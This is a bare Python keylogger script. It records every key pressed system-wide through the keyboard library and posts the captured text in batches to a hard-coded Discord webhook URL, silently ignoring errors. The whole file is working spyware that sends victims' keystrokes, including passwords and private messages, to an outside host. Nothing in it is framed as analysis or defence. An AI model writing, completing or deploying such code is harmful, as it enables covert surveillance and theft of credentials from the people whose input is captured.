import os
import requests
import keyboard

WEBHOOK = "https://discord.com/api/webhooks/1487633660386742402/kpbrjzvaYLbaYiPJYEcAhpnpyul9wrXmpOS2fV4Mbq1xx9Yc73_Pmiq1A2bt0Djaetxt"

log = ""

def on_key(event):
    global log
    log += event.name
    if len(log) > 100:
        try:
            requests.post(WEBHOOK, json={"content": log})
            log = ""
        except:
            pass

keyboard.on_press(on_key)
keyboard.wait()